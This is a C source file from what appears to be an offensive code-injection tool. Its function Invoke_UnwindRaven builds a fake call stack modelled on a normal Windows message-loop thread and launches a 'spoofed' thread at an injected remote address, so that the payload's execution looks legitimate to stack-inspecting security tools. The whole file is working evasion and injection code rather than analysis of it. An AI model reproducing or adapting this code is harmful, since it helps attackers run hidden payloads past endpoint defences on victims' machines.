#include "unwindraven_integration.h"
#include "dispatch.h"
#include "payload.h"
#include <stdio.h>

#define UR_MAX_BP_ENTRIES   64
#define UR_MAX_STACK_FRAMES 64

BOOL Invoke_UnwindRaven(PINJECTION_CONTEXT ctx)
{
    printf("[DEBUG] Running Invoke_UnwindRaven\n");

    StackProfileEntry blueprint[] = {
        { L"C:\\Windows\\system32\\win32u.dll", "NtUserGetMessage", 0x14, FALSE, TRUE, 0 },
        { L"C:\\Windows\\system32\\USER32.dll", "GetMessageW", 0x22, FALSE, TRUE, 0 },
        { L"C:\\Windows\\system32\\KERNEL32.DLL", "BaseThreadInitThunk", 0x17, FALSE, TRUE, 0 },
        { L"C:\\Windows\\system32\\ntdll.dll", "RtlUserThreadStart", 0x2C, FALSE, TRUE, 0 }
    };    

    int bpCount = sizeof(blueprint) / sizeof(blueprint[0]);

    UR_STACK_CONTEXT sctx = {0};
    StackFrame frames[UR_MAX_STACK_FRAMES];
    int frameCount = 0;

    if (!BuildSyntheticStackFromBlueprint(&sctx,
                                          blueprint,
                                          bpCount,
                                          frames,
                                          &frameCount))
    {
        printf("[-] Invoke_UnwindRaven: failed to build synthetic stack.\n");
        return FALSE;
    }

    DumpSyntheticStack(frames, frameCount);

    printf("[*] Invoke_UnwindRaven: running start spoofed thread.\n");

    HANDLE hSpoofed = StartSpoofedThread(
        frames,
        frameCount,
        (void*)ctx->pRemoteAddress,
        ctx,
        NULL,
        NULL,
        NULL
    );

    if (!hSpoofed)
    {
        printf("[-] Invoke_UnwindRaven: failed to start spoofed thread.\n");
        return FALSE;
    }

    // blocking for the thread to run
    WaitForSingleObject(hSpoofed, INFINITE);

    printf("Invoke_UnwindRaven: flavor=%d\n", ctx->invokeFlavor);

    printf("Invoke_UnwindRaven: has returned from entryPoint\n");

    return (ctx->hThread != NULL);
}